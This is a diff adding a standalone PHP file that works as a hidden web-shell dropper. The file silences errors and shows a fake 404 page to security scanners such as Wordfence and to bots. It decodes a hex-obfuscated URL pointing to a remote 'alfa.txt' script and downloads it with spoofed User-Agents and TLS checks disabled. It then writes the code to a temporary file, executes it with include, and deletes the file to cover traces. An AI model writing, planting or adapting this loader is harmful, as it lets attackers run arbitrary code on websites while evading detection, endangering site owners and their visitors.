@@ -1,0 +1,129 @@
+<?php
+// Disable error reporting and hide errors from output
+error_reporting(0);
+@ini_set('display_errors', 0);
+
+// List of User-Agent keywords to block (scanners, bots, WAF)
+$blockedAgents = ['Wordfence', 'WAF', 'ScannerBot', 'curl', 'bot', 'spider', 'crawler'];
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+foreach ($blockedAgents as $agent) {
+    if (stripos($userAgent, $agent) !== false) {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+}
+
+// Hex-encoded URL of remote PHP script
+$hexUrl = '68747470733A2F2F616C66612D6775692E70616765732E6465762F616C66612E747874';
+
+/**
+ * Convert a hex string to ASCII string
+ * @param string $hex
+ * @return string
+ */
+function hexToString($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+    }
+    return $str;
+}
+
+/**
+ * Download content from URL using random User-Agent with fallback methods
+ * @param string $url
+ * @return string|false Content or false on failure
+ */
+function downloadContent($url) {
+    $userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+    ];
+    $randomUserAgent = $userAgents[array_rand($userAgents)];
+
+    if (ini_get('allow_url_fopen')) {
+        $contextOptions = [
+            "http" => [
+                "method" => "GET",
+                "header" => "User-Agent: $randomUserAgent\r\n",
+                "timeout" => 5,
+                "ignore_errors" => true
+            ]
+        ];
+        $context = stream_context_create($contextOptions);
+        $data = @file_get_contents($url, false, $context);
+        if ($data !== false) return $data;
+    }
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        $data = curl_exec($ch);
+        if (curl_errno($ch)) {
+            error_log('Curl error: ' . curl_error($ch));
+            curl_close($ch);
+            return false;
+        }
+        curl_close($ch);
+        if ($data !== false) return $data;
+    }
+
+    // Fallback: fopen/fread (no custom User-Agent)
+    $result = false;
+    if ($fp = @fopen($url, 'r')) {
+        $result = '';
+        while ($chunk = fread($fp, 8192)) {
+            $result .= $chunk;
+        }
+        fclose($fp);
+    }
+    return $result;
+}
+
+class ScriptHandler {
+    private $script;
+
+    public function setScript($script) {
+        $this->script = $script;
+    }
+
+    public function getScript() {
+        $temp = $this->script;
+        $this->script = null;
+        return $temp;
+    }
+}
+
+$url = hexToString($hexUrl);
+$scriptHandler = new ScriptHandler();
+
+$phpScript = downloadContent($url);
+if ($phpScript === false) {
+    die("Failed to download PHP script from the URL.");
+}
+
+$scriptHandler->setScript($phpScript);
+
+$tempFile = tempnam(sys_get_temp_dir(), 'script_');
+if ($tempFile === false) {
+    die("Failed to create temporary file.");
+}
+
+if (file_put_contents($tempFile, $scriptHandler->getScript()) === false) {
+    die("Failed to write to temporary file.");
+}
+
+include($tempFile);
+
+if (file_exists($tempFile)) {
+    unlink($tempFile);
+} else {
+    error_log("Temporary file not found for deletion.");
+}
+?>
